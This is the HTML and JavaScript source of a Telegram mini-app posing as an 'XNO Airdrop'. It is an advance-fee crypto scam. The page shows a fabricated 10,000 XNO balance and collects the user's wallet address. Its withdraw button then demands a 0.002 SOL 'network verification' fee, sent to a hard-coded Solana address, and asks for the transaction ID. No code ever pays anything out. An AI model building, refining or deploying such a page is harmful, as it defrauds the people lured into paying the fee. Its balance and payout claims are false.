<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XNO Airdrop</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; user-select: none; }
        .card { background: #1e2329; border-radius: 16px; border: 1px solid #2d3339; }
        .tab-content { display: none; }
        .active-tab { display: block; }
        .nav-item { color: #848e9c; cursor: pointer; text-align: center; font-size: 10px; transition: 0.3s; }
        .active-nav { color: #f1c40f; }
        .big-logo { width: 220px; height: 220px; border-radius: 50%; border: 4px solid #f1c40f; box-shadow: 0 0 30px rgba(241, 196, 15, 0.15); }
        .btn-withdraw { background: #22c55e; color: white; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body class="p-4 pb-24">

    <div class="card p-3 mb-6 text-center border-blue-500/20">
        <p class="text-[9px] text-gray-500 uppercase tracking-widest mb-1">Airdrop Distribution Countdown</p>
        <div class="flex justify-center gap-4 font-bold text-blue-400">
            <div><span id="days">15</span><p class="text-[8px] text-gray-600">DAYS</p></div>
            <div><span id="hours">16</span><p class="text-[8px] text-gray-600">HRS</p></div>
            <div><span id="mins">08</span><p class="text-[8px] text-gray-600">MIN</p></div>
            <div><span id="secs">20</span><p class="text-[8px] text-gray-600">SEC</p></div>
        </div>
    </div>

    <div id="homeTab" class="tab-content active-tab text-center">
        <div class="mb-4">
            <h1 class="text-4xl font-black italic">10,000 <span class="text-blue-500 text-xl">XNO</span></h1>
            <p class="text-gray-500 text-[10px] uppercase">Verified Balance</p>
        </div>
        <div class="flex justify-center my-10">
            <img src="https://cryptologos.cc/logos/nano-xno-logo.png" class="big-logo" alt="XNO Logo">
        </div>
        <div class="card p-4 border-green-500/30">
            <p class="text-green-500 font-bold text-sm"><i class="fas fa-check-circle"></i> 10,000 XNO SECURED!</p>
        </div>
    </div>

    <div id="taskTab" class="tab-content">
        <h2 class="text-xl font-bold mb-6 italic">New Tasks (+80 XNO)</h2>
        <div class="space-y-4">
            <div class="card p-4 flex justify-between items-center">
                <div class="flex items-center gap-3">
                    <i class="fab fa-telegram text-xl text-blue-400"></i>
                    <div><p class="text-xs font-bold">Join Channel</p><p class="text-[9px] text-gray-500">+80 XNO</p></div>
                </div>
                <button onclick="tg.openLink('https://t.me/XNO_AIRDROP_OFFICIAL')" class="bg-blue-600 px-5 py-2 rounded-full text-[10px] font-bold">START</button>
            </div>
        </div>
    </div>

    <div id="walletTab" class="tab-content">
        <h2 class="text-xl font-bold mb-6 italic">Withdraw Funds</h2>
        
        <div class="card p-5 mb-6">
            <p class="text-[10px] text-blue-400 font-bold mb-2 uppercase">Receiver Wallet (XNO/SOL)</p>
            <input type="text" id="userWallet" placeholder="Paste your address here" class="w-full bg-black/40 border border-gray-700 p-3 rounded-xl text-xs outline-none focus:border-blue-500 transition-all mb-4">
            <button onclick="tg.showAlert('Address Saved!')" class="w-full py-3 bg-blue-600 rounded-xl font-bold text-xs uppercase shadow-lg shadow-blue-500/20">Save Details</button>
        </div>

        <div class="card p-6 text-center">
            <button onclick="handleWithdraw()" class="w-full py-4 btn-withdraw rounded-xl shadow-lg shadow-green-500/20 active:scale-95 transition-all">
                Withdraw
            </button>
            
            <div id="txSection" class="hidden mt-6 pt-6 border-t border-gray-800">
                <p class="text-[10px] text-yellow-500 mb-2 uppercase font-bold text-left">Submit Transaction ID</p>
                <input type="text" placeholder="Enter TxID after paying fee" class="w-full bg-black/40 border border-gray-700 p-3 rounded-xl text-[10px] mb-3 outline-none">
                <button onclick="tg.showAlert('Submission received! Verifying...')" class="w-full py-2 bg-gray-800 rounded-lg text-[10px] font-bold uppercase">Submit ID</button>
            </div>
        </div>
    </div>

    <div class="fixed bottom-0 left-0 w-full bg-[#0b0e11] border-t border-gray-800 flex justify-around p-4 z-50">
        <div onclick="showTab('homeTab', this)" class="nav-item active-nav flex-1"><i class="fas fa-home text-xl mb-1 block"></i>Home</div>
        <div onclick="showTab('taskTab', this)" class="nav-item flex-1"><i class="fas fa-tasks text-xl mb-1 block"></i>Task</div>
        <div onclick="showTab('walletTab', this)" class="nav-item flex-1"><i class="fas fa-wallet text-xl mb-1 block"></i>Wallet</div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // Timer Logic (For UI only, change 'isEnded' to true for testing)
        let isEnded = false; 

        function showTab(id, el) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-tab'));
            document.getElementById(id).classList.add('active-tab');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
            el.classList.add('active-nav');
        }

        function handleWithdraw() {
            if (!isEnded) {
                // টাইমার শেষ না হলে এই মেসেজ দেখাবে
                tg.showAlert("You can withdraw your valuable tokens only after the Airdrop ends.");
            } else {
                // টাইমার শেষ হলে এই মেসেজ দেখাবে
                tg.showConfirm("Network Verification Required.\n\nFee: 0.002 SOLANA\nSend to: 6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3\n\nDid you send the fee?", (confirmed) => {
                    if(confirmed) {
                        document.getElementById('txSection').classList.remove('hidden');
                    }
                });
            }
        }

        // Test toggle: টাইমার শেষ হয়েছে কিনা দেখার জন্য (ডেভেলপমেন্টের জন্য)
        // setTimeout(() => { isEnded = true; }, 5000); 
    </script>
</body>
</html>
